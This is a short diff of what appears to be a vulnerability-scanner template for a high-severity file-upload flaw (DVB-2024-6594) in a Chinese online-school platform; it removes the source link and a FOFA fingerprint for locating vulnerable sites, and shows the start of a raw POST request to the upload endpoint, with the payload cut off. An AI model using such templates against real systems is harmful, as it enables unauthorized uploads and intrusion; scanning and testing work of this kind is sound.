@@ -3,12 +3,8 @@ info:
   name: 云课网校系统文件上传漏洞(DVB-2024-6594)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bhgd7h8ow4ex3zzi'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bhgd7h8ow4ex3zzi
-    fofa: '"/static/libs/common/jquery.stickyNavbar.min.js"'
 http:
 - raw:
   - 'POST /api/uploader/uploadImage HTTP/1.1
